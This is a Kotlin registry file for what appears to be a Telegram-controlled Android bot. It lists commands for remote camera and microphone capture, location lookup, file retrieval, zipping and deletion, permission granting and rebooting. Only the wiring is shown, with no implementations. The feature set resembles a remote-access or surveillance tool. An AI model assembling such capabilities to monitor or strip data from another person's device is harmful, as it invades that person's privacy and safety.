package com.example.telegramadmin.commands

import com.example.telegramadmin.commands.impl.GetFileCommand
import com.example.telegramadmin.commands.impl.CameraFrontCommand
import com.example.telegramadmin.commands.impl.CameraBackCommand
import com.example.telegramadmin.commands.impl.MicrophoneCommand
import com.example.telegramadmin.commands.impl.HelpCommand
import com.example.telegramadmin.commands.impl.ListFilesCommand
import com.example.telegramadmin.commands.impl.LocationCommand
import com.example.telegramadmin.commands.impl.OpenFileCommand
import com.example.telegramadmin.commands.impl.PingCommand
import com.example.telegramadmin.commands.impl.RebootDeviceCommand
import com.example.telegramadmin.commands.impl.RestartAppCommand
import com.example.telegramadmin.commands.impl.StatusCommand
import com.example.telegramadmin.commands.impl.StopServiceCommand
import com.example.telegramadmin.commands.impl.ZipFolderCommand
import com.example.telegramadmin.commands.impl.DeleteFileCommand
import com.example.telegramadmin.commands.impl.MakeDirectoryCommand
import com.example.telegramadmin.commands.impl.RenameFileCommand
import com.example.telegramadmin.commands.impl.GrantStorageCommand

/** Ordered registry of every command the bot understands. Lookup is case-insensitive. */
class CommandRegistry(private val commands: List<Command>) {

    private val byName: Map<String, Command> = commands.associateBy { it.name.lowercase() }

    fun find(name: String): Command? = byName[name.lowercase()]

    fun all(): List<Command> = commands

    companion object {
        /** Builds the registry with every built-in command. HelpCommand needs the final list,
         * so it's added last with a reference to everything registered before it. */
        fun buildDefault(): CommandRegistry {
            val core = listOf(
                PingCommand(),
                StatusCommand(),
                ListFilesCommand(),
                LocationCommand(),
                OpenFileCommand(),
                GetFileCommand(),
                RestartAppCommand(),
                StopServiceCommand(),
                RebootDeviceCommand(),
                ZipFolderCommand(),
                DeleteFileCommand(),
                MakeDirectoryCommand(),
                RenameFileCommand(),
                GrantStorageCommand(),
                CameraFrontCommand(),
                CameraBackCommand(),
                MicrophoneCommand()
            )
            val withHelp = core + HelpCommand(core)
            return CommandRegistry(withHelp)
        }
    }
}
